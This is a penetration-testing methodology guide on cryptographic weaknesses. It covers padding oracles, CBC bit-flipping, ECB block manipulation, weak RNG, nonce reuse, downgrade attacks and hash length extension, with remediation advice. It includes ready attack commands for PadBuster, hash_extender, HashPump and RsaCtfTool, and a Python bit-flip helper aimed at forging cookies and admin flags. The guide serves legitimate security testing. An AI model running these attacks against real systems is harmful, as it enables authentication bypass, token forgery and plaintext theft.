# Cryptographic Attack Testing

## Overview
Cryptographic attacks exploit weaknesses in the implementation, configuration, or usage of cryptographic algorithms. These include padding oracle attacks, CBC bit-flipping, ECB block manipulation, weak random number generation, key reuse vulnerabilities, protocol downgrade attacks, and hash length extension attacks. Successful exploitation can lead to plaintext recovery, data tampering, authentication bypass, and complete confidentiality breakdown.

## Classification
- **CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-328 (Use of Weak Hash), CWE-330 (Use of Insufficiently Random Values), CWE-326 (Inadequate Encryption Strength)
- **OWASP:** A02:2021 - Cryptographic Failures
- **CVSS Base:** 5.9 - 9.8 (Medium to Critical)
- **MITRE ATT&CK:** T1557 (Adversary-in-the-Middle), T1573 (Encrypted Channel)

## Detection Methodology

### 1. Padding Oracle Attack
Exploit error differences when ciphertext with invalid padding is submitted:
```
1. Identify encrypted values in cookies, tokens, or parameters (often base64-encoded)
2. Modify the last byte of the second-to-last ciphertext block
3. Submit modified ciphertext and observe response differences:
   - "Padding error" / "Invalid PKCS7 padding" → distinct from other errors
   - HTTP 500 vs HTTP 403 → different error handling paths
   - Response time differences → timing oracle variant
4. Use byte-by-byte decryption via the oracle
```

**Tool — PadBuster:**
```bash
# Decrypt a cookie value
padbuster http://target.com/login.php <encrypted_cookie> 8 -cookies "auth=<encrypted_cookie>"

# Encrypt arbitrary plaintext
padbuster http://target.com/login.php <encrypted_cookie> 8 -plaintext "admin=1" -cookies "auth=<encrypted_cookie>"

# Specify encoding (0=Base64, 1=lowercase hex, 2=uppercase hex, 3=.NET URL token, 4=WebSafe Base64)
padbuster http://target.com/ <ciphertext> 16 -encoding 0
```

### 2. CBC Bit-Flipping Attack
Modify ciphertext to produce controlled changes in decrypted plaintext:
```
CBC decryption: P[n] = D(C[n]) XOR C[n-1]

To flip a bit in plaintext block n:
1. Identify the target byte position in the plaintext
2. XOR the corresponding byte in ciphertext block n-1:
   C'[n-1][i] = C[n-1][i] XOR original_byte XOR desired_byte
3. Block n-1 plaintext will be corrupted, but block n will contain the desired value

Example — changing "role=user" to "role=admin":
- Locate the byte offset of "user" in the plaintext
- Calculate XOR difference and apply to the preceding ciphertext block
```

### 3. ECB Block Manipulation
Exploit the deterministic nature of ECB mode (identical plaintext blocks produce identical ciphertext blocks):
```
Detection:
- Encrypt repeated plaintext (e.g., 32+ identical bytes)
- If ciphertext contains repeated blocks → ECB mode confirmed
- Look for 16-byte (AES) or 8-byte (DES/3DES) repeating patterns

Exploitation:
- Block reordering: rearrange ciphertext blocks to change plaintext meaning
- Block substitution: copy known blocks from one context to another
- Chosen-plaintext byte-at-a-time: align target secret at block boundary, brute-force one byte at a time
```

### 4. Weak Random Number Generation (RNG)
Identify predictable randomness in tokens, keys, nonces, and IVs:
```
- Collect multiple tokens/nonces and look for patterns
- Check for sequential values, timestamps as seeds, or short cycle lengths
- Test for known weak PRNGs: Math.random(), rand(), mt_rand()
- Verify IVs are not static, sequential, or derived from predictable sources
- Check if nonces are reused (fatal for GCM, CTR, and stream ciphers)
```

**Tool — z3 (SMT Solver) for Mersenne Twister recovery:**
```python
# After collecting 624 consecutive 32-bit outputs from mt_rand() / mt19937
# Use z3 or untwister to recover internal state and predict future outputs
untwister -i collected_outputs.txt -s mt19937
```

### 5. Key Reuse and Nonce Reuse
```
Stream cipher / CTR mode nonce reuse:
  C1 XOR C2 = P1 XOR P2 → crib dragging to recover plaintext

AES-GCM nonce reuse:
  Recovers the authentication key H → allows forgery of arbitrary messages

Two-time pad detection:
  XOR two ciphertexts; if result has ASCII-range character patterns → likely reused key
```

### 6. Downgrade Attacks
Force systems to use weaker cryptographic algorithms:
```
- Modify ClientHello to remove strong cipher suites (MITM)
- Strip TLS version to force SSL 3.0 or TLS 1.0
- Force export-grade ciphers (FREAK, Logjam)
- Downgrade HMAC algorithms in API negotiations
- Force fallback from AES-256 to DES/3DES/RC4

FREAK: Force RSA_EXPORT cipher suites (512-bit RSA)
Logjam: Force DHE_EXPORT (512-bit DH parameters)
```

### 7. Hash Length Extension Attack
Exploit Merkle-Damgard hashes (MD5, SHA-1, SHA-256) when used as MACs:
```
Vulnerable pattern: MAC = H(secret || message)

Attack:
1. Given MAC = H(secret || original_message) and len(secret)
2. Compute H(secret || original_message || padding || extension) without knowing the secret
3. The internal hash state from the known MAC allows continued hashing

Tool — hash_extender:
  hash_extender -d "original_data" -s <known_signature> -a "appended_data" -f sha256 -l <secret_length>

Tool — HashPump:
  hashpump -s <original_hash> -d "original_data" -a ";admin=true" -k <secret_length>
```

## Tool Usage

### Custom Python Crypto Testing
```python
# Detect ECB mode
from Crypto.Cipher import AES
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# CBC bit-flip helper
def cbc_bitflip(ciphertext, block_size, byte_pos, old_byte, new_byte):
    ct = bytearray(ciphertext)
    target_block = byte_pos // block_size
    offset_in_block = byte_pos % block_size
    prev_block_byte = (target_block - 1) * block_size + offset_in_block
    ct[prev_block_byte] ^= ord(old_byte) ^ ord(new_byte)
    return bytes(ct)
```

### CrypTool / RsaCtfTool
```bash
# RSA attacks (small e, Wiener, Hastad, common factor)
RsaCtfTool --publickey key.pub --attack all
RsaCtfTool --publickey key.pub --uncipherfile cipher.enc
```

## Remediation
1. **Use authenticated encryption** (AES-GCM, ChaCha20-Poly1305) instead of CBC without HMAC
2. **Ensure constant-time error handling** -- never reveal padding validity distinctly
3. **Use unique, random IVs/nonces** for every encryption operation
4. **Avoid ECB mode** entirely -- use CBC, CTR, or GCM
5. **Use HMAC or AEAD** instead of H(key||message) for MAC construction
6. **Use cryptographically secure RNG** (os.urandom, /dev/urandom, SecureRandom)
7. **Enforce minimum protocol versions** and strong cipher suites
8. **Rotate keys** periodically and after any suspected compromise
9. **Use established libraries** (libsodium, OpenSSL, Bouncy Castle) -- never roll custom crypto

## Evidence Collection
When documenting cryptographic attack findings:
- Identify the exact algorithm, mode, and key size in use
- Capture the oracle behavior (distinct error messages, timing differences)
- Document the attack steps with payloads and responses
- Record any plaintext recovered or data tampered
- Note the cryptographic library and version if identifiable
- Assess impact: confidentiality breach, integrity violation, authentication bypass
- Provide proof-of-concept code demonstrating the vulnerability
